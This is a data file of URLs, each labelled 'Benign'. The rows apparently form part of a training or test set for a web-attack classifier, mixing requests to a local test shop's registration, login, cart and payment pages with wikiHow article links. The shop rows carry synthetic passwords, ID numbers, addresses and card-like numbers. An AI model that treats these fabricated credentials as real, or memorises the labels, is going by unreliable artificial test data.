http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=luscombe&password=_4ej6&nombre=odila&apellidos=ripoll%e8s+mera&email=harnois%40rubirubi.sb&dni=91270497b&direccion=santisima+trinidad+99%2c+&ciudad=bohonal+de+ibor&cp=44166&provincia=tarragona&ntc=7553909942434640&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=thorson&password=corruptivo&nombre=buenaventura&apellidos=heuvan+llad%f3s&email=dear_terr%40nikemujeres.sc&dni=98458584t&direccion=calle+la+rabida+31%2c+&ciudad=villamandos&cp=37115&provincia=burgos&ntc=2511625444669752&b1=registrar,Benign
http://www.wikihow.com/make-a-rosemary-and-strawberry-face-cream&t=1396593528087&n=3893112&k=mainentity,Benign
http://www.wikihow.com/chat-to-facebook-friends-while-using-twitter-account&t=1396629866048&n=5436789&k=mainentity,Benign
http://www.wikihow.com/make-a-salt-painting&t=1396516945260&n=280229&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=rao&password=t42da&nombre=saba&apellidos=nasmuta+peirone&email=bisley%40raullazaro.cl&dni=51367296q&direccion=senda+seron%2c+168%2c+&ciudad=torrijas&cp=19490&provincia=c%f3rdoba&ntc=9050101948590095&b1=registrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1684&b1=pasar+por+caja,Benign
http://www.wikihow.com/invest-in-gold-etf&t=1396613357864&n=4815115&k=mainentity,Benign
http://www.wikihow.com/preserve-your-paint-with-an-acrylic-paint-conditioner&t=1396516996505&n=283361&k=mainentity,Benign
http://www.wikihow.com/maintain-a-spray-tan&t=1396594039780&n=3920016&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=768&b1=pasar+por+caja,Benign
http://www.wikihow.com/make-a-passion-fruit-mixer&t=1396517146273&n=295565&k=mainentity,Benign
http://www.wikihow.com/understand-girls-in-middle-school&t=1396611696744&n=4760532&k=mainentity,Benign
http://www.wikihow.com/cook-sour-boiled-sail-fish-(dusun-style)&t=1396547269025&n=1758076&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=coogan&pwd=adonizarse&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tunghsin&password=as3ill2s3&nombre=rayburn&apellidos=cuni+humet&email=kilgore.angiolillo%40adondeir.ro&dni=75568615e&direccion=calle+lisboa+98+&ciudad=urue%f1a&cp=19268&provincia=cuenca&ntc=1930240979052274&b1=registrar,Benign
http://www.wikihow.com/buy-a-checkbook-calculator&t=1396613005859&n=4800847&k=mainentity,Benign
http://www.wikihow.com/install-the-skitch-for-desktop-program-on-a-windows-pc&t=1396630470946&n=5458859&k=mainentity,Benign
http://www.wikihow.com/attend-the-taping-of-the-disney-park%27s-christmas-day-parade&t=1396527955200&n=854933&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=crain&pwd=acornado&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=100&cantidad=48&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/bake-miniature-chocolate-chip-muffins&t=1396595179571&n=3979035&k=mainentity,Benign
http://www.wikihow.com/be-a-british-chick&t=1396517901982&n=350551&k=mainentity,Benign
http://www.wikihow.com/burn-video-to-dvd-with-avs4you-software&t=1396533784875&n=1129857&k=mainentity,Benign
http://www.wikihow.com/put-pictures-on-a-playstation-portable&t=1396531527031&n=1024921&k=mainentity,Benign
http://www.wikihow.com/clean-up-when-you-really-don%27t-want-to&t=1396613570526&n=4820796&k=mainentity,Benign
http://www.wikihow.com/delete-a-file-you-don%27t-want-(macs)&t=1396533244832&n=1104901&k=mainentity,Benign
http://www.wikihow.com/have-a-safe-day-at-a-theme-park&t=1396527911263&n=853045&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=minority&pwd=06217o43do&remember=off&b1=entrar,Benign
http://www.wikihow.com/say-%22no%22-diplomatically&t=1396609858712&n=4696676&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=betteann&pwd=%2b6sc4p9c8n5&remember=off&b1=entrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=39&cantidad=31&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=euclid5&password=cau3o&nombre=damila&apellidos=villalta+tapasco&email=wheatcroft%40deltamarina.vu&dni=60253629t&direccion=c%2f+martinez+de+la+rosa%2c+61+4d&ciudad=castroviejo&cp=06939&provincia=salamanca&ntc=8173244424971818&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=macelwee&password=aburr-ir&nombre=norcelo&apellidos=cabezas&email=maxey%40karldeux.cg&dni=72927491b&direccion=paseo+menendez+pelayo+172+7-a&ciudad=hueva&cp=14420&provincia=asturias&ntc=5960331754539682&b1=registrar,Benign
http://www.wikihow.com/make-a-squirrel-costume&t=1396528319947&n=874445&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=zonechin&pwd=cala%f1a&remember=on&b1=entrar,Benign
http://www.wikihow.com/help-someone-who-is-moving&t=1396571423376&n=2987701&k=mainentity,Benign
http://www.wikihow.com/make-friends-with-a-guy-one-just-met&t=1396571529196&n=2991349&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6574&b1=pasar+por+caja,Benign
http://www.wikihow.com/get-rid-of-bagworms&t=1396563197823&n=2597812&k=mainentity,Benign
http://www.wikihow.com/flake-brazil-nuts&t=1396546459556&n=1706988&k=mainentity,Benign
http://www.wikihow.com/create-a-forum-in-mybb&t=1396532289067&n=1058730&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=tesh6&pwd=05490pa9%cd1&remember=off&b1=entrar,Benign
http://www.wikihow.com/make-metal-wrench-chimes&t=1396609522025&n=4684129&k=mainentity,Benign
http://www.wikihow.com/buy-porcelain-dinnerware&t=1396563334407&n=2605332&k=mainentity,Benign
http://www.wikihow.com/make-homemade-puff-paint&t=1396516982261&n=282277&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2882&b1=confirmar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=sheelagh&password=rehin3hir&nombre=heraldo&apellidos=gonyalon+salobre%f1a&email=goertz%40satellites.st&dni=71658245c&direccion=c%2f+luis+llorente%2c+s%2fn%2c+11%3fg&ciudad=lorqu%ed&cp=10883&provincia=valencia&ntc=7089450300383912&b1=registrar,Benign
http://www.wikihow.com/bake-candy-dandies-cookies&t=1396594942874&n=3958071&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=haskins&password=ca_rne&nombre=mamerta&apellidos=planet+renart&email=washburn%40blog-aromaterapia.sc&dni=31237989x&direccion=claudio+carudel%2c+138+&ciudad=useras%2fuseres%2c+les&cp=09515&provincia=almer%eda&ntc=1254936080019647&b1=registrar,Benign
http://www.wikihow.com/convert-.avi-files-to-the-ipad-for-enjoyment&t=1396534189413&n=1148309&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4892&b1=confirmar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=medeiros&password=confundiente&nombre=islay&apellidos=tutusaus&email=whitton%40chaqueta.com.edu&dni=77470447f&direccion=terre+46%2c+4-b&ciudad=maderal%2c+el&cp=06750&provincia=c%e1ceres&ntc=4239160102094172&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hazelrig&password=apurativo&nombre=am%e9rica&apellidos=sanges+andr%e9u&email=pepito%40marketingmunicipal.bj&dni=24562422d&direccion=pasaje+santa+isabel%2c+45+12-h&ciudad=almeg%edjar&cp=20495&provincia=barcelona&ntc=7775887552046645&b1=registrar,Benign
http://www.wikihow.com/select-a-gps-car-navigation-system&t=1396533403631&n=1111589&k=mainentity,Benign
http://www.wikihow.com/install-total-screen-recorder-gold&t=1396533730085&n=1127145&k=mainentity,Benign
http://www.wikihow.com/make-donut-pie&t=1396515820277&n=218189&k=mainentity,Benign
http://www.wikihow.com/learn-script-writing&t=1396534107433&n=1144085&k=mainentity,Benign
http://www.wikihow.com/decorate-your-room-with-paper&t=1396562073972&n=2526408&k=mainentity,Benign
http://www.wikihow.com/have-a-pocket-pc&t=1396534134703&n=1145613&k=mainentity,Benign
http://www.wikihow.com/become-god-consciousness&t=1396569908002&n=2925673&k=mainentity,Benign
http://www.wikihow.com/remove-cotton-wood-fuzzies-from-window-screens&t=1396562533187&n=2555252&k=mainentity,Benign
http://www.wikihow.com/fight-spam-on-a-community-board&t=1396532300110&n=1059130&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=alice&password=9pecha&nombre=anacleto&apellidos=barcel%f3+celada&email=gowland%40puntodevistafotografia.ky&dni=48395550p&direccion=c%2f+vaixell+120+8%3fh&ciudad=peleas+de+abajo&cp=50239&provincia=lleida&ntc=1903176307118488&b1=registrar,Benign
http://www.wikihow.com/easily-blox-someone-roblox&t=1396647879272&n=5940943&k=mainentity,Benign
http://www.wikihow.com/use-an-external-monitor-for-cover-flow-in-itunes&t=1396534408677&n=1159365&k=mainentity,Benign
http://www.wikihow.com/prepare-your-company-for-an-ipo&t=1396613370387&n=4815619&k=mainentity,Benign
http://www.wikihow.com/apply-hygienic-makeup&t=1396593572778&n=3896196&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=nowina-k&pwd=3u1i24e&remember=off&b1=entrar,Benign
http://www.wikihow.com/make-a-harry-potter-room&t=1396633364120&n=5525729&k=mainentity,Benign
http://www.wikihow.com/fix-registry-files&t=1396532859154&n=1084464&k=mainentity,Benign
http://www.wikihow.com/make-watermelon-salsa&t=1396613986264&n=4840260&k=mainentity,Benign
http://www.wikihow.com/use-a-bookmobile-library&t=1396527821917&n=848821&k=mainentity,Benign
http://www.wikihow.com/install-and-uninstall-applications-from-terminal-in-ubuntu&t=1396610618321&n=4722186&k=mainentity,Benign
http://www.wikihow.com/choose-the-right-nursing-program&t=1396609694145&n=4691611&k=mainentity,Benign
http://www.wikihow.com/flavour-brew-with-bread-and-apples&t=1396517224547&n=299445&k=mainentity,Benign
http://www.wikihow.com/make-a-pretend-military&t=1396528253069&n=869941&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=joson&password=i8co47e6t53ili3a3&nombre=ainal%e9n&apellidos=tristan&email=besse%40camiones-hibridos.et&dni=22224771d&direccion=av.+san+juan+de+sahagun%2c+49%2c+&ciudad=pol%e1n&cp=43739&provincia=segovia&ntc=1904361078579149&b1=registrar,Benign
http://www.wikihow.com/protect-trees-from-lightning&t=1396631238511&n=5477648&k=mainentity,Benign
http://www.wikihow.com/reduce-life-insurance-premium&t=1396613326663&n=4814055&k=mainentity,Benign
http://www.wikihow.com/get-coins-and-fame-on-movie-star-planet&t=1396648370077&n=5962623&k=mainentity,Benign
http://www.wikihow.com/intimidate-people-on-runescape&t=1396631988579&n=5494458&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=100&cantidad=23&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hobart&password=desamparar&nombre=kasuhiro&apellidos=cloquell+pesarrodona&email=waldemar%40hayunmundoahifuera.co&dni=10959428c&direccion=c%2f+estadio%2c+80%2c+&ciudad=puebla+de+la+calzada&cp=12414&provincia=navarra&ntc=2994741473360819&b1=registrar,Benign
http://www.wikihow.com/get-a-cool-girl-to-like-you&t=1396611895898&n=4767310&k=mainentity,Benign
http://www.wikihow.com/pray-the-divine-office-or-liturgy-of-the-hours&t=1396569676094&n=2914925&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=emlynne&password=sistematizaci%f3n&nombre=isabella&apellidos=cabot+brot%f3&email=oland5%40schnaps.com.by&dni=51920905s&direccion=camino+ronda%2c+72%2c+&ciudad=total%e1n&cp=28473&provincia=valladolid&ntc=5686265534103266&b1=registrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mullinix&pwd=53m7roba4le&remember=off&b1=entrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=sergeant&password=es401dec126s&nombre=yamil&apellidos=polo+castany%e9&email=bieber%40pecher.sk&dni=76410524q&direccion=calle+joaquin+verdugo+landi+162%2c+&ciudad=albalate+del+arzobispo&cp=32740&provincia=barcelona&ntc=6025849643141641&b1=registrar,Benign
http://www.wikihow.com/bunny-hop-on-a-scooter&t=1396531393553&n=1017929&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=keelia&password=oi09r&nombre=maijhara&apellidos=tort+paladell&email=jacobi%40ajuntamentbcn20.edu&dni=11012634g&direccion=c%2f+huerta+tres+cancelas+11+1%3fe&ciudad=pe%f1amellera+baja&cp=33936&provincia=soria&ntc=1715858391293714&b1=registrar,Benign
http://www.wikihow.com/calm-a-puppy&t=1396516732433&n=268468&k=mainentity,Benign
http://www.wikihow.com/make-streusel-top-peach-pie&t=1396516071792&n=236914&k=mainentity,Benign
http://www.wikihow.com/post-on-farmer100-forum&t=1396532320515&n=1060058&k=mainentity,Benign
http://www.wikihow.com/make-a-sprite-and-dr-pepper-drink&t=1396545725217&n=1657520&k=mainentity,Benign
http://www.wikihow.com/make-a-banana-apple-sauce-pur%c3%a9e-snack&t=1396515696053&n=208017&k=mainentity,Benign
http://www.wikihow.com/make-traditional-korean-soup&t=1396594858673&n=3950795&k=mainentity,Benign
http://www.wikihow.com/login-to-yelp-with-the-yelp-for-iphone-app&t=1396629603555&n=5425741&k=mainentity,Benign
http://www.wikihow.com/make-lip-color-at-home&t=1396593778880&n=3906436&k=mainentity,Benign
http://www.wikihow.com/make-raw-unpasteurized-juice&t=1396545680982&n=1655196&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=85&cantidad=39&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/make-a-cucumber-facial&t=1396593416769&n=3885992&k=mainentity,Benign
http://www.wikihow.com/install-pinterest-to-your-phone&t=1396629658822&n=5428269&k=mainentity,Benign
http://www.wikihow.com/increase-job-satisfaction&t=1396612697679&n=4791917&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=maire&password=compl7ment8ria&nombre=nelio&apellidos=boneton+casares&email=ewart_givney%40mauvier.se&dni=64253263a&direccion=calle+gonzalez+de+mendoza+38%2c+&ciudad=pozoantiguo&cp=08818&provincia=granada&ntc=0661310331831922&b1=registrar,Benign
http://www.wikihow.com/shine-as-a-teen-girl&t=1396630593748&n=5460886&k=mainentity,Benign
http://www.wikihow.com/beat-no.-5-of-mushroom-xiii-in-kingdom-hearts-ii&t=1396649052044&n=5989146&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=dempsey&pwd=nacarig%fce&remember=off&b1=entrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8781&b1=pasar+por+caja,Benign
http://www.wikihow.com/make-cricket-tacos&t=1396613998372&n=4841200&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=de_baets&password=p84a43&nombre=tarsilia&apellidos=galdon&email=shenar%40nikemujeres.gg&dni=94851838e&direccion=vicent+andreu+estelles%2c+106+1%3fe&ciudad=carboneras&cp=15589&provincia=%c1vila&ntc=6365782989212461&b1=registrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=39&cantidad=91&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/make-an-italian-chicken-panini&t=1396610359839&n=4712030&k=mainentity,Benign
http://www.wikihow.com/make-a-pomegranate-float&t=1396545714387&n=1656984&k=mainentity,Benign
http://www.wikihow.com/tie-up-chin-length-hair&t=1396594530856&n=3939651&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=rolston&password=digestir&nombre=sotero&apellidos=bolado&email=darvor%40tacticlinks.cn&dni=96600995y&direccion=c%2f+vizcaya+94%2c+&ciudad=asparrena&cp=12222&provincia=navarra&ntc=3820038609958090&b1=registrar,Benign
http://www.wikihow.com/have-the-best-account-on-stardoll&t=1396647809032&n=5937907&k=mainentity,Benign
http://www.wikihow.com/discover-a-new-musical-style&t=1396564215363&n=2657746&k=mainentity,Benign
http://www.wikihow.com/get-lots-of-guy-friends&t=1396612026997&n=4772494&k=mainentity,Benign
http://www.wikihow.com/get-closer-to-islam-if-you-are-a-new-convert&t=1396570067148&n=2931721&k=mainentity,Benign
http://www.wikihow.com/make-eggnog-bread&t=1396594933751&n=3957179&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=zulema&password=av8ni52ra&nombre=alexio&apellidos=pucherc%f3s+guamangallo&email=gerstle_armand%40mayoriasilenciosa.ec&dni=00747949n&direccion=doctor+roges%2c+s%2fn%2c+6-b&ciudad=fresneda+de+la+sierra&cp=18192&provincia=tarragona&ntc=3695630957544582&b1=registrar,Benign
http://www.wikihow.com/create-your-own-cursor&t=1396613696707&n=4824841&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=85&cantidad=29&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/cheer-up-a-friend-when-they-go-through-a-breakup&t=1396570645387&n=2955865&k=mainentity,Benign
http://www.wikihow.com/write-a-meaningful-diary&t=1396527886783&n=852121&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=fuller&pwd=mesilla&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=218&b1=pasar+por+caja,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8553&b1=confirmar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9819&b1=confirmar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=shunmuga&password=8sq43l6d9&nombre=eligio&apellidos=pedreira+llorca&email=halton.dominguez%40truecatucasa.il&dni=41439619j&direccion=calle+corsega%2c+91+7-g&ciudad=olivares+de+duero&cp=08784&provincia=%c1vila&ntc=9319505461670365&b1=registrar,Benign
http://www.wikihow.com/make-pour-over-fondant&t=1396595164358&n=3977915&k=mainentity,Benign
http://www.wikihow.com/make-pretzel-fish&t=1396546735186&n=1722672&k=mainentity,Benign
http://www.wikihow.com/upload-to-scratch.mit.edu&t=1396532345060&n=1060842&k=mainentity,Benign
http://www.wikihow.com/find-fonts-you-already-downloaded-on-your-pc-(win-7)&t=1396611022830&n=4740606&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3878&b1=confirmar,Benign
http://www.wikihow.com/select-a-location-for-a-first-communion-party&t=1396547091804&n=1740728&k=mainentity,Benign
http://www.wikihow.com/have-gorgeous-gray-hair&t=1396594651508&n=3942735&k=mainentity,Benign
http://www.wikihow.com/be-famous-on-animal-jam-(the-easy-way)&t=1396648225613&n=5956791&k=mainentity,Benign
http://www.wikihow.com/extend-system-partition-on-sbs-2008-with-no-reinstallation-with-partition-magic&t=1396533640493&n=1122441&k=mainentity,Benign
http://www.wikihow.com/get-a-guy-to-notice-you-by-looks&t=1396570755462&n=2960089&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=gradeigh&pwd=1lmizcler3&remember=off&b1=entrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam%f3n+ib%e9rico&precio=85&cantidad=74&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=leppert&pwd=tiz9n37llo&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=39&cantidad=49&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hestia&password=barredero&nombre=niceto&apellidos=carabelli+larra%f1aga&email=miki%40blanquillos.cd&dni=06726126y&direccion=c%2f+la+mudarra+96+&ciudad=robledillo+de+gata&cp=06930&provincia=navarra&ntc=1621649363596106&b1=registrar,Benign
http://www.wikihow.com/make-carbonaras-spaghetti-in-harvest-moon:-animal-parade&t=1396649555865&n=6008010&k=mainentity,Benign
http://www.wikihow.com/act-in-front-of-the-parents-of-a-first-girlfriend&t=1396571149846&n=2976993&k=mainentity,Benign
http://www.wikihow.com/break-a-witchcraft-spell&t=1396569618096&n=2912737&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1590&b1=confirmar,Benign
http://www.wikihow.com/get-a-refund-from-bloomspot&t=1396629525417&n=5422421&k=mainentity,Benign
http://www.wikihow.com/make-easter-garibaldi-biscuits&t=1396546422780&n=1704600&k=mainentity,Benign
http://www.wikihow.com/make-an-orange-martini&t=1396632519832&n=5504007&k=mainentity,Benign
http://www.wikihow.com/make-a-virgin-fruit-on-the-beach-cocktail&t=1396545817718&n=1663436&k=mainentity,Benign
http://www.wikihow.com/edit-your-browser%27s-dictionary&t=1396532394935&n=1063630&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=atwell3&pwd=en1it6ut5626io&remember=off&b1=entrar,Benign
http://www.wikihow.com/find-ballroom-dancing-classes&t=1396594711106&n=3944005&k=mainentity,Benign
http://www.wikihow.com/deal-with-a-moody-co-worker&t=1396612585791&n=4789667&k=mainentity,Benign
http://www.wikihow.com/delete-a-desktop-background-picture-from-a-mac&t=1396533244025&n=1104881&k=mainentity,Benign
http://www.wikihow.com/compare-car-tv-systems-before-you-buy&t=1396531603392&n=1028249&k=mainentity,Benign
http://www.wikihow.com/make-purple-ice-hawaiian-punch&t=1396517170982&n=296989&k=mainentity,Benign
http://www.wikihow.com/have-a-relaxing-bubble-bath&t=1396593258455&n=3876668&k=mainentity,Benign
http://www.wikihow.com/kiss-your-boyfriend-in-front-of-your-mom&t=1396611583369&n=4757343&k=mainentity,Benign
http://www.wikihow.com/care-for-a-yorkie&t=1396516675958&n=266384&k=mainentity,Benign
http://www.wikihow.com/make-the-best-dairy-licious-drink&t=1396545606279&n=1650056&k=mainentity,Benign
http://www.wikihow.com/bake-cookies-with-the-bullet-express-collection&t=1396594944556&n=3958219&k=mainentity,Benign
http://www.wikihow.com/create-rules-for-a-book-club&t=1396527705446&n=843509&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2909&b1=confirmar,Benign
http://www.wikihow.com/expose-the-illuminati&t=1396569748335&n=2918345&k=mainentity,Benign
http://www.wikihow.com/order-scholastic-books-from-school&t=1396527767582&n=846265&k=mainentity,Benign
http://www.wikihow.com/look-after-your-recorder-instrument&t=1396613758309&n=4828169&k=mainentity,Benign
http://www.wikihow.com/connect-to-a-vps&t=1396531737416&n=1033026&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=nobuyuki&password=0ep87t11&nombre=telmo&apellidos=arg%fcelles+cienfuegos&email=chowraj%40tiaherminia.ad&dni=28323226z&direccion=travesia+2%2fa+travesia+de+vigo%2c+81+&ciudad=figueres&cp=22131&provincia=%c1vila&ntc=7241173905047603&b1=registrar,Benign
http://www.wikihow.com/make-pistachio-pesto-(cheese-free)&t=1396546476863&n=1708044&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=85&cantidad=74&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/check-out-a-dog-walker&t=1396516688827&n=267052&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=whitcomb3&password=f00da&nombre=riley&apellidos=vallverd%fa+orfila&email=steinrueck8%40productosgarantizados.gov&dni=33908887x&direccion=calle+barreres%2c+65%2c+&ciudad=navatejares&cp=06498&provincia=cuenca&ntc=6531738879978731&b1=registrar,Benign
http://www.wikihow.com/make-it-seem-like-someone-else-punched-you&t=1396632768722&n=5509028&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kouji&password=h4m9a&nombre=siglinda&apellidos=creixell+yvosevich&email=sagoe%40transportesvegasl.mp&dni=54839907h&direccion=avenida+blasco+iba%f1ez%2c+11+&ciudad=encinas+de+abajo&cp=26200&provincia=valladolid&ntc=7003865807722762&b1=registrar,Benign
http://www.wikihow.com/create-a-contest-on-daily-motion&t=1396610464069&n=4716238&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam%f3n+ib%e9rico&precio=39&cantidad=25&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=dita&password=muebler%eda&nombre=rossana&apellidos=hurtubia&email=uraneff%40granbretana.com.cv&dni=59011262r&direccion=c%2f+san+vicente%2c+3%2c+8c&ciudad=orexa&cp=50268&provincia=lleida&ntc=0703537056337149&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kibler6&password=blenorr%e1gica&nombre=noayan&apellidos=descarr%e9+alcolea&email=cravat-close%40blogsmegumi.web&dni=91531466e&direccion=eras+de+cristo+89+3%3fd&ciudad=valdeolmos-alalpardo&cp=33323&provincia=murcia&ntc=2183980302594165&b1=registrar,Benign
http://www.wikihow.com/be-the-best-girl-in-the-world&t=1396526562639&n=789887&k=mainentity,Benign
http://www.wikihow.com/migrate-typo3-to-joomla-using-cms2cms-service&t=1396533878900&n=1133425&k=mainentity,Benign
http://www.wikihow.com/get-truck-equipment-financing-with-bad-credit&t=1396613184656&n=4808931&k=mainentity,Benign
http://www.wikihow.com/have-the-special-girl-you-have-your-eyes-on-be-impressed&t=1396571063161&n=2973477&k=mainentity,Benign
http://www.wikihow.com/ride-a-roller-coaster-that-has-a-loop&t=1396527932681&n=854017&k=mainentity,Benign
http://www.wikihow.com/turn-used-tires-into-storage-bins&t=1396562685476&n=2565644&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam%f3n+ib%e9rico&precio=100&cantidad=11&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/set-a-buddy-icon-on-ichat&t=1396611300205&n=4750145&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=600&b1=pasar+por+caja,Benign
http://www.wikihow.com/have-a-belief-in-reincarnation&t=1396570189553&n=2936749&k=mainentity,Benign
http://www.wikihow.com/cope-if-you-get-banned-from-a-windows-or-linux-forum&t=1396532283709&n=1058598&k=mainentity,Benign
http://www.wikihow.com/create-a-tapered-leg-in-sketchup&t=1396630405650&n=5456251&k=mainentity,Benign
http://www.wikihow.com/call-a-friend-that-you-have-not-spoke-to-in-a-long-time&t=1396571632528&n=2995685&k=mainentity,Benign
http://www.wikihow.com/create-a-note-in-notability&t=1396534192005&n=1148401&k=mainentity,Benign
http://www.wikihow.com/kill-a-doombringer-in-greenwood-town&t=1396648581517&n=5972675&k=mainentity,Benign
http://www.wikihow.com/upload-photos-on-couchsurfing&t=1396629466809&n=5419825&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=euysoo&pwd=aserto&remember=on&b1=entrar,Benign
http://www.wikihow.com/dress-like-sam-axe&t=1396528352436&n=876505&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ingeborg&password=enhu_988r&nombre=vaniria&apellidos=carbonell&email=scofield_kutvolgyi%40lodgemadrid.ir&dni=21256002t&direccion=cami+des+castell+43+1f&ciudad=is%f2vol&cp=09443&provincia=c%e1diz&ntc=8155801623953999&b1=registrar,Benign
http://www.wikihow.com/buy-a-bluetooth-car-kit&t=1396533268667&n=1105653&k=mainentity,Benign
"http://www.wikihow.com/make-spicy-red-chilli-yoghurt-to-accompany-pakoras,-samosas-or-chapattis&t=1396527014948&n=816520&k=mainentity",Benign
http://www.wikihow.com/decorate-a-room-for-little-cost&t=1396562142620&n=2530240&k=mainentity,Benign
http://www.wikihow.com/make-a-frazzleberry-pie&t=1396515779870&n=214253&k=mainentity,Benign
http://www.wikihow.com/use-craigupload.com&t=1396629972973&n=5440989&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=621&b1=confirmar,Benign
http://www.wikihow.com/appoint-a-technician-for-door-step-services&t=1396562460164&n=2549680&k=mainentity,Benign
http://www.wikihow.com/select-a-mobility-scooter-for-a-short-person&t=1396531384898&n=1017545&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=newton&password=qu8n8e5*6a&nombre=c%e9sar&apellidos=doval&email=lebeau%40mariposasentudia.tr&dni=70218283l&direccion=calle+cruz+del+sur%2c+194+10%3fd&ciudad=moralina&cp=48410&provincia=barcelona&ntc=6961855330943947&b1=registrar,Benign
http://www.wikihow.com/suggest-an-improvement-to-a-disney-park-ride-(as-a-park-visitor)&t=1396527999441&n=857385&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam%f3n+ib%e9rico&precio=100&cantidad=68&b1=a%f1adir+al+carrito,Benign
